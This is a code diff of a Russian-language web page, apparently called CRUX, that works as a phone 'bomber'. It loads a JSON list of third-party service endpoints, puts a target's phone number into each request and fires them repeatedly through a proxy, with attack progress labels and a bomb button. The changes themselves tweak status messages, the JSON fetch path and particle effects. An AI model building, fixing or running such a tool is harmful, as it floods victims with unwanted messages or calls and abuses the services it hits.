@@ -98,7 +98,7 @@
     <div class="settings-content">
         <div class="close-settings" id="closeSettings">✕</div>
         <div class="title" style="font-size: 1.1rem; margin-bottom: 20px;">CRUX SETTINGS</div>
-        <div id="debugStatus" style="font-size: 0.7rem; color: #8a8aff; margin-bottom: 10px;">Статус: Ожидание...</div>
+        <div id="statusIndicator" style="font-size: 0.7rem; margin-bottom: 10px; color: #8a8aff;">Статус: Проверка...</div>
         <button class="attack-btn" id="reloadServices" style="width:100%;">ОБНОВИТЬ JSON</button>
     </div>
 </div>
@@ -134,7 +134,7 @@
         draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = this.isExplosion ? this.alpha : 0.4; ctx.beginPath(); ctx.arc(this.x, this.y, this.isExplosion ? 2 : 1.2, 0, Math.PI * 2); ctx.fill(); }
     }
 
-    for(let i=0; i<60; i++) bgParticles.push(new Particle());
+    for(let i=0; i<70; i++) bgParticles.push(new Particle());
     function animate() { 
         ctx.clearRect(0, 0, canvas.width, canvas.height); 
         bgParticles.forEach(p => { p.update(); if(p.x<0||p.x>canvas.width) p.vx*=-1; if(p.y<0||p.y>canvas.height) p.vy*=-1; p.draw(); }); 
@@ -143,27 +143,21 @@
     }
     animate();
 
-    // ФУНКЦИЯ СОЕДИНЕНИЯ С JSON
     async function loadServices() {
-        const debug = document.getElementById('debugStatus');
+        const status = document.getElementById('statusIndicator');
         const counter = document.getElementById('servicesCounter');
-        debug.innerText = "Статус: Загрузка JSON...";
-        
         try {
-            // Добавляем timestamp для обхода кеша GitHub
-            const response = await fetch('services.json?v=' + Math.random());
-            if (!response.ok) throw new Error("Файл не найден");
-            
-            const data = await response.json();
+            // ИСПРАВЛЕНИЕ: Используем относительный путь ./ для GitHub Pages
+            const res = await fetch('./services.json?nocache=' + Date.now());
+            if (!res.ok) throw new Error();
+            const data = await res.json();
             loadedServices = Array.isArray(data) ? data : (data.services || []);
-            
             counter.innerText = loadedServices.length;
-            debug.innerText = `Успешно: загружено ${loadedServices.length} шт.`;
-            debug.style.color = "#8aff8a";
+            status.innerText = "Статус: Подключено (" + loadedServices.length + ")";
+            status.style.color = "#8aff8a";
         } catch (e) {
-            console.error("JSON LOAD ERROR:", e);
-            debug.innerText = "Ошибка: JSON не найден или поврежден!";
-            debug.style.color = "#ff8a8a";
+            status.innerText = "Статус: Файл не найден";
+            status.style.color = "#ff8a8a";
             counter.innerText = "0";
         }
     }
@@ -175,9 +169,7 @@
             let body = s.body;
             if (typeof body === 'object') body = JSON.stringify(body).replace(/%phone%/g, cleanPhone);
             else body = String(body).replace(/%phone%/g, cleanPhone);
-
             const fetchUrl = PROXY_URL + "?url=" + encodeURIComponent(s.url);
-
             await fetch(fetchUrl, {
                 method: s.method || 'POST',
                 headers: s.headers || { "Content-Type": "application/json" },
@@ -189,22 +181,21 @@
     async function startAttack(phone) {
         const reps = parseInt(document.getElementById('repeat').value) || 1;
         const progress = document.getElementById('progressFill');
-        const status = document.getElementById('statusTxt');
+        const statusTxt = document.getElementById('statusTxt');
         isAttacking = true;
         const total = loadedServices.length * reps;
         let done = 0;
-
         for (let i = 0; i < reps && isAttacking; i++) {
             for (let s of loadedServices) {
                 if (!isAttacking) break;
                 await fire(s, phone);
                 done++;
                 progress.style.width = (done / total * 100) + "%";
-                status.innerText = `Атака: ${done}/${total}`;
+                statusTxt.innerText = `Удар: ${done}/${total}`;
                 await new Promise(r => setTimeout(r, 400)); 
             }
         }
-        status.innerText = "ГОТОВО";
+        statusTxt.innerText = "ЗАВЕРШЕНО";
         setTimeout(() => { document.getElementById('loadingOverlay').classList.remove('show'); progress.style.width="0%"; }, 1500);
         isAttacking = false;
     }
@@ -226,7 +217,7 @@
         bomb.classList.add('active-anim');
         setTimeout(() => bomb.classList.remove('active-anim'), 700);
         const rect = bomb.getBoundingClientRect();
-        for(let i=0; i<25; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
+        for(let i=0; i<30; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
     };
 
     document.getElementById('openSettings').onclick = () => document.getElementById('settingsModal').classList.add('active');
@@ -238,7 +229,6 @@
         document.getElementById('selectedCode').innerText = i.innerText;
         document.getElementById('codeSelector').classList.remove('active');
     });
-    window.onclick = () => document.getElementById('codeSelector').classList.remove('active');
 })();
 </script>
 </body>
